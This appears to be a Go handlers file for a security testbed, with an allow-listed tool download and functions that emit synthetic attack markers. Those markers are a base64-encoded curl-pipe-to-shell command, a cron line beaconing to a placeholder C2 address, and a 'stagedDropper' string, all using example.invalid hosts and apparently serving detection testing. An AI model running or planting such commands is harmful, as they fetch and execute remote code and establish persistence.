package handlers

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"time"
)

const trustedToolURL = "https://downloads.example.invalid/reach-testbed-tool.bin"

func FetchTool(w http.ResponseWriter, r *http.Request) {
	fetchTool(w, r, &http.Client{Timeout: 5 * time.Second})
}

func fetchTool(w http.ResponseWriter, r *http.Request, client *http.Client) {
	source := r.URL.Query().Get("url")
	if !allowedToolURL(source) {
		http.Error(w, "invalid tool URL", http.StatusBadRequest)
		return
	}

	req, err := http.NewRequestWithContext(r.Context(), http.MethodGet, trustedToolURL, nil)
	if err != nil {
		writeClientError(w, r, http.StatusInternalServerError, "internal error", err, "build trusted tool request")
		return
	}

	resp, err := client.Do(req)
	if err != nil {
		writeClientError(w, r, http.StatusBadGateway, "bad gateway", err, "fetch trusted tool")
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode < http.StatusOK || resp.StatusCode >= http.StatusMultipleChoices {
		writeClientError(w, r, http.StatusBadGateway, "bad gateway", fmt.Errorf("unexpected status %s", resp.Status), "fetch trusted tool")
		return
	}

	out, err := os.CreateTemp(os.TempDir(), "reach-testbed-tool-*.bin")
	if err != nil {
		writeClientError(w, r, http.StatusInternalServerError, "internal error", err, "create fetched tool temp file")
		return
	}
	defer out.Close()
	target := out.Name()

	if _, err := io.Copy(out, io.LimitReader(resp.Body, 2<<20)); err != nil {
		writeClientError(w, r, http.StatusInternalServerError, "internal error", err, "store fetched tool file")
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}

func allowedToolURL(raw string) bool {
	parsed, err := url.Parse(raw)
	if err != nil {
		return false
	}
	if parsed.Scheme != "https" || parsed.Host != "downloads.example.invalid" || parsed.Path != "/reach-testbed-tool.bin" {
		return false
	}
	return parsed.User == nil && parsed.RawQuery == "" && parsed.Fragment == "" && parsed.Port() == ""
}
